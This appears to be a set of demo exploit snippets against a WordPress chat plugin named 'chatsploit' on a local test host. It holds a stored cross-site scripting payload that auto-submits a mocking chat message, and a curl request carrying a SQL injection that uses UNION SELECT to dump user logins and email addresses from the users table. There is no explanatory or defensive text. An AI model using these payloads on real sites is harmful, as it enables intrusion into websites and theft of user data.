```js
haX0R = true
```

```html
<script>
(function() {
	if ( 'undefined' !== typeof haX0R ) { return; }
	jQuery( '.widget_chat_sploit textarea' ).val( 'I am lame HAHAHA' );
	jQuery( '.widget_chat_sploit form' ).submit();
})()
</script>
```

```bash
curl -i 'http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit&since=2013-04-18+05:33:47%27+UNION+SELECT+user_login+AS+author%2C+user_email+AS+text%2C+0+AS+time+FROM+wp2_users+--+'
```
